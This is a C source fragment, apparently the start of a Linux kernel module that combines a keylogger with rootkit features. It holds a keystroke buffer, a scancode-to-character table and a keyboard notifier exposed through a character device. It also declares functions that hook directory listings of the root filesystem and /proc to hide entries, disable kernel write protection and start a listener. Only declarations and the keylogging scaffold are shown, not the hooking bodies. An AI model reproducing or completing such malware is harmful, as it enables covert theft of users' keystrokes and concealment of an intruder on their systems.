#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <linux/types.h>
#include <linux/input.h>

#define KEYLOG_MAJOR   60
#define BUFF_LENGTH 1024
#define FIRST_CD    KEY_1
#define LAST_CD     58
#define UK "UNKOWN"

char buffer[BUFF_LENGTH+1];
char* bptr = buffer;
char* endptr = (buffer+sizeof(buffer)-1);
int shift = 0;

//legend: ^=shift,<=caps *=ctrl
const char ch_table[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
		   '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
		   '*', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
		   '^', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', '^', 
		   'X', 'X', 'X', '<'};

inline char get_ascii(int code) {
	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X';
	else if(code == KEY_SPACE) return ' ';
	
	return ch_table[(code-FIRST_CD)];
}

static int new_root_filldir(void*, const char*, int, loff_t, u64, unsigned int);
int new_root_readdir(struct file *file, void*, filldir_t);
static int new_proc_filldir(void*, const char*, int, loff_t, u64, unsigned int);
int new_proc_readdir(struct file *file, void*, filldir_t);
void add_to_list(void*, unsigned char[], unsigned char[]);
void start_hook(void* , void*);
void resume_hook(void*);
void pause_hook(void*);
void* get_readdir(const char*);
static int start_listener(char*);
static int kill_listener(void);
void enable_wp(void);
void disable_wp(void);
long get_my_pid(void);
int keylog_open(struct inode *inode, struct file *filp);
ssize_t read_keystroke(struct file *filp, char *buf, size_t count, loff_t *f_pos);
int keyboard_notifier(struct notifier_block* nblock, unsigned long code, void* param);

struct file_operations keylog_fops = {
  .owner = THIS_MODULE,
  .read = read_keystroke,
  .open = keylog_open
};

struct notifier_block nb = {
  .notifier_call = keyboard_notifier
};
